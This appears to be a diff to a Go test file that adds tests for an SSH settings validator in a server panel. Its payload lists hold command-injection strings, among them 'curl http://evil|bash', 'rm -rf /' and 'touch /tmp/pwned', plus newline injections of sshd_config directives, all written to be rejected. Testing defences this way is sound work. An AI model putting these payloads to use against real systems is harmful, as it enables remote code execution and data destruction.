@@ -185,6 +185,121 @@ func TestCheckSSHLogSearchInfo(t *testing.T) {
 	})
 }
 
+// TestCheckSSHUpdateParams 直接测试 Update 的 Key/NewValue 白名单校验函数：
+// 不依赖 sshd/systemctl 等机器状态。Update 入口先调用该校验，再写文件与执行
+// semanage/防火墙联动，因此恶意值不会触达任何命令拼接或配置写入。
+func TestCheckSSHUpdateParams(t *testing.T) {
+	t.Run("valid port values are allowed", func(t *testing.T) {
+		for _, v := range []string{"1", "22", "2222", "65535"} {
+			if err := checkSSHUpdateParams("Port", v); err != nil {
+				t.Fatalf("Port %q should be allowed, got err: %v", v, err)
+			}
+		}
+	})
+
+	t.Run("port injection and out-of-range values are rejected", func(t *testing.T) {
+		payloads := []string{
+			"22; curl http://evil|bash",  // 命令注入（semanage 拼接）
+			"22 && touch /tmp/pwned",     // 命令注入
+			"99999",                      // 超出端口范围
+			"0",                          // 超出端口范围
+			"-1",                         // 负数
+			"abc",                        // 非数字
+			"22 ",                        // 尾随空格
+			"2222\nPort 1337",            // 换行注入 sshd_config 指令
+			"2222\r\nPermitRootLogin no", // 回车换行注入
+			"22\x00",                     // NUL
+			"22\t",                       // 制表符（控制字符）
+		}
+		for _, v := range payloads {
+			assertErrCmdIllegal(t, checkSSHUpdateParams("Port", v))
+		}
+	})
+
+	t.Run("yes/no keys accept lowercase yes and no only", func(t *testing.T) {
+		for _, key := range []string{"PasswordAuthentication", "PubkeyAuthentication", "UseDNS"} {
+			for _, v := range []string{"yes", "no"} {
+				if err := checkSSHUpdateParams(key, v); err != nil {
+					t.Fatalf("%s=%q should be allowed, got err: %v", key, v, err)
+				}
+			}
+		}
+	})
+
+	t.Run("yes/no keys reject other forms", func(t *testing.T) {
+		// sshd 本身对 yes/no 大小写不敏感，但面板前端仅提交小写 yes/no，
+		// 此处按最严格口径收口（见修复报告说明）。
+		payloads := []string{"YES", "Yes", "NO", "1", "0", "true", "", "yes no", "yes\n"}
+		for _, key := range []string{"PasswordAuthentication", "PubkeyAuthentication", "UseDNS"} {
+			for _, v := range payloads {
+				assertErrCmdIllegal(t, checkSSHUpdateParams(key, v))
+			}
+		}
+	})
+
+	t.Run("PermitRootLogin accepts sshd legal values used by panel", func(t *testing.T) {
+		for _, v := range []string{"yes", "no", "without-password", "prohibit-password", "forced-commands-only"} {
+			if err := checkSSHUpdateParams("PermitRootLogin", v); err != nil {
+				t.Fatalf("PermitRootLogin=%q should be allowed, got err: %v", v, err)
+			}
+		}
+		assertErrCmdIllegal(t, checkSSHUpdateParams("PermitRootLogin", "maybe"))
+	})
+
+	t.Run("ListenAddress accepts valid IPs and empty value", func(t *testing.T) {
+		for _, v := range []string{
+			"",
+			"192.168.1.10",
+			"0.0.0.0",
+			"::",
+			"192.168.1.10,10.0.0.1", // 多地址（updateSSHConf 按逗号拆分为多行）
+			"0.0.0.0,::",
+			"2001:db8::1",
+		} {
+			if err := checkSSHUpdateParams("ListenAddress", v); err != nil {
+				t.Fatalf("ListenAddress=%q should be allowed, got err: %v", v, err)
+			}
+		}
+	})
+
+	t.Run("ListenAddress rejects invalid and injected values", func(t *testing.T) {
+		payloads := []string{
+			"evil; touch /tmp/pwned",              // 命令注入
+			"1.1.1.1;rm -rf /",                    // 命令注入
+			"192.168.1.10\nListenAddress 0.0.0.0", // 换行注入
+			"192.168.1.10;1.1.1.1",                // 分号分隔（合法分隔符仅为逗号）
+			"999.999.1.1",                         // 非法 IPv4
+			"192.168.1.0/24",                      // sshd ListenAddress 不接受网段写法
+			"example.com",                         // 域名不做放行
+		}
+		for _, v := range payloads {
+			assertErrCmdIllegal(t, checkSSHUpdateParams("ListenAddress", v))
+		}
+	})
+
+	t.Run("keys outside whitelist are rejected", func(t *testing.T) {
+		for _, key := range []string{"Ciphers", "AllowUsers", "Subsystem", "port", "Port ", "", "Match"} {
+			assertErrCmdIllegal(t, checkSSHUpdateParams(key, "harmless-looking-value"))
+		}
+	})
+}
+
+// TestUpdateRejectsMaliciousParams 端到端验证：Update 入口处即拒绝恶意 Key/NewValue，
+// 不会执行到读取/写入 /etc/ssh/sshd_config、semanage 或防火墙逻辑
+// （校验为 Update 第一条语句，返回结果是确定性的）。
+func TestUpdateRejectsMaliciousParams(t *testing.T) {
+	u := &SSHService{}
+	reqs := []dto.SSHUpdate{
+		{Key: "Port", NewValue: "22; curl http://evil|bash"},
+		{Key: "Port", NewValue: "99999"},
+		{Key: "Port", NewValue: "2222\nPermitRootLogin no"},
+		{Key: "Ciphers", NewValue: "aes128-ctr"},
+	}
+	for _, req := range reqs {
+		assertErrCmdIllegal(t, u.Update(req))
+	}
+}
+
 // TestLoadLogRejectsMaliciousInfo 端到端验证：恶意 Info 在进入任何文件遍历/命令
 // 构造之前即被拒绝，且不会在磁盘上产生任何注入副作用（pwned 文件不被创建）。
 // 校验位于 LoadLog 入口，因此在 filepath.Walk 之前返回，测试结果是确定性的。
